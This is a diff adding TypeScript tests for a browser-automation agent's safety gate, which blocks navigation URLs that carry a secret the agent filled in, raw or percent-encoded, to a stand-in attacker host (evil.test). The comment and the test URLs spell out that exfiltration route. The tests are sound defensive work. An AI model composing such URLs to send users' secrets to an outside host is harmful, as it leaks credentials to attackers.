@@ -174,6 +174,71 @@ describe("browser safetyCheck", () => {
   });
 });
 
+// Outbound exfiltration gate: redaction scrubs registered secrets from
+// everything the model READS, but the model can still compose a navigation
+// URL that carries a filled value OUT to an attacker host
+// (https://evil.test/?q=<secret>). safetyCheck refuses such URLs — raw or
+// percent-encoded — with a generic message that never echoes the value.
+describe("browser safetyCheck registered-secret URL gate", () => {
+  const taskId = "task-secret-url-gate";
+  const secret = "hunter2-correct-horse";
+
+  afterEach(() => {
+    browserTest.resetFilledSecretsForTest();
+  });
+
+  test("blocks a URL embedding a registered secret verbatim", () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    const result = safetyCheck(`https://evil.test/?q=${secret}`);
+    expect(result).toBeDefined();
+    expect(result!.startsWith("Blocked:")).toBe(true);
+    expect(result).not.toContain(secret);
+  });
+
+  test("blocks the percent-encoded form of a registered secret", () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    const encoded = secret
+      .split("")
+      .map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, "0")}`)
+      .join("");
+    const result = safetyCheck(`https://evil.test/?q=${encoded}`);
+    expect(result).toBeDefined();
+    expect(result!.startsWith("Blocked:")).toBe(true);
+    // Generic message: neither the raw value nor its encoded form leaks
+    // into the trace/audit row.
+    expect(result).not.toContain(secret);
+    expect(result).not.toContain(encoded);
+  });
+
+  test("secrets registered by another task still block (cross-task union)", () => {
+    // safetyCheck reads the union across every active task's registry —
+    // the shared-BrowserContext architecture means a secret typed by one
+    // task can surface in another task's composed URL.
+    browserTest.recordFilledSecretForTest("some-other-task", secret);
+    expect(safetyCheck(`https://evil.test/?q=${secret}`)).toBeDefined();
+  });
+
+  test("values below the redaction floor do not block", () => {
+    // Mirrors recordFilledSecret's floor: a tiny value substring-matches
+    // structural URL bytes and would false-positive on ordinary URLs.
+    browserTest.recordFilledSecretForTest(taskId, "abc");
+    expect(safetyCheck("https://example.com/?q=abc")).toBeUndefined();
+  });
+
+  test("unrelated URLs still pass while secrets are registered", () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    expect(safetyCheck("https://example.com/")).toBeUndefined();
+  });
+
+  test("browser_navigate fails closed pre-flight without echoing the value", async () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    const raw = await browserNavigate(taskId, { url: `https://evil.test/?q=${secret}` });
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(raw).not.toContain(secret);
+  });
+});
+
 // Smoke test for the CDP-vs-launch decision. We can't actually exercise
 // playwright-core's connectOverCDP / launch without spawning Chromium —
 // the real verification happens in the manual end-to-end run. What we CAN
